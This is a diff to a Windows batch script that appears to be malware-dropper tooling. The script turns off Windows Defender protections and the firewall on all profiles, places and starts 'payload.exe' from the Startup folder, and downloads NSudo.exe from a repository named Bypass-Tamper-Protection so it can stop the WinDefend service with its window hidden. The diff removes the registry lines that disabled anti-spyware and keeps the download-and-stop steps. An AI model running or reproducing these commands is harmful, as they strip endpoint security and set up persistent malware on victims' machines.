@@ -61,9 +61,6 @@ powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"
 
 powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
 
-powershell.exe -command "Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
-powershell.exe -command "REG ADD “hklm\software\policies\microsoft\windows defender” /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
-
 powershell.exe -command "netsh advfirewall set allprofiles state off"
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
@@ -72,9 +69,7 @@ start payload.exe
 
 cd  %temp%
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe', '.\NSudo.exe') }
-  
-
-sc query WinDefend | find "STATE" | find "RUNNING" && goto :stop
-
-:stop
+ 
 NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend & exit /b
+
+
